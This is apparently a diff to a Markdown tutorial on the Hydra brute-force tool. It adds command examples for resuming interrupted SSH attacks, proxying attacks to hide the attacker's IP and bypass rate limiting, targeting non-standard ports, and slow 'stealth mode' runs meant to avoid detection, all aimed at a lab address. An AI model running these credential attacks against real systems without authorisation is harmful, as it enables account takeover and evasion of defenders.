@@ -90,28 +90,77 @@ hydra -l admin -P pass.txt ssh://172.16.6.128 -vV -o attack.log -b json
 ```
 
 ## 6. Advanced Techniques
-### Resuming Sessions
+
+### Resuming Interrupted Sessions
+When running large attacks that get interrupted, Hydra allows you to resume from where you left off.
+
 ```bash
 hydra -R hydra.restore
 ```
-- Automatically creates restore file
-- Resume with same command + `-R`
 
-### Proxy Chaining
+### When to Use:
+- During long brute-force attacks
+- After network disconnections
+- When systems crash mid-attack
+
+### Example:
 ```bash
-hydra -x http://127.0.0.1:8080 -l user -P pass.txt ftp://target.com
+# Start initial attack
+hydra -L users.txt -P big_passlist.txt ssh://172.16.6.128 -vV
+
+# Later resume the attack
+hydra -R hydra.restore
 ```
 
-### Custom Port Services
+### Proxy Chaining for Anonymity
+Route your attacks through proxies to hide your IP address.
+
 ```bash
-hydra -s 2222 -l root -P ssh_words.txt ssh://172.16.6.128
+hydra -x http://proxy_ip:port -l username -P passlist.txt ftp://target.com
 ```
 
-**When to Use Advanced Options:**
-- `-u`: When accounts have lockout policies
-- `-e nsr`: For quick credential checks
-- `-w 30+`: Against rate-limited systems
-- `-t 1`: For stealthy testing
+### When to Use:
+- When target blocks your IP
+- For anonymity requirements
+- To bypass rate limiting
+
+### Example:
+```bash
+hydra -x http://127.0.0.1:8080 -l admin -P passwords.txt ftp://172.16.6.128
+```
+
+### Attacking Non-Standard Ports
+Many services run on custom ports instead of default ones.
+
+```bash
+hydra -s custom_port -l username -P passlist.txt service://target
+```
+
+### When to Use:
+- For SSH on port 2222 instead of 22
+- When testing custom configurations
+- During security assessments
+
+### Example:
+```bash
+hydra -s 2222 -l root -P ssh_passwords.txt ssh://172.16.6.128
+```
+
+### Stealth Mode Attacks
+Slow, low-profile attacks to avoid detection.
+
+```bash
+hydra -l user -P pass.txt -t 1 -w 60 -vV ssh://target
+```
+
+### Technique Details:
+- `-t 1` → Single connection (very slow)
+- `-w 60` → 60 second delay between attempts
+
+### Example:
+```bash
+hydra -l admin -P top100.txt -t 1 -w 120 -vV ssh://172.16.6.128
+```
 
 ## 7. Full Command Examples
 ### Comprehensive SSH Attack
